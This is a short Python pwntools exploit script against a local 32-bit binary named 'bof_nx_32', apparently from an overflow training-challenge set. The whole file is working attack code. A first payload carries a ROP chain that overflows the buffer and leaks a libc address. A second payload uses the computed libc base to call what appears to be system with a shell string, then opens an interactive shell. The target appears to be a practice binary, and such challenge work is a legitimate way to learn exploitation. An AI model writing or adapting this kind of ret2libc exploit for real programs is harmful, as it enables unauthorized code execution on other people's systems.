from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/3_bof_nx_32/bof_nx_32")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x90\x04\x08C\x93\x04\x08\x1c\xc0\x04\x08`\x90\x04\x08C\x93\x04\x08\x80\xc8\x04\x08C\x93\x04\x08|\xc8\x04\x08%\x91\x04\x08\n'
p.send(payload)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7ffefeec\n')
libc_base = u32(p.recv()[0:4].ljust(4,b'\x00')) + -0x18eb0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p32(libc_base + 0x3d3d0) + p32(0x0) + p32(libc_base + 0x17e1db)
payload += b"\n"
p.send(payload)
p.interactive()
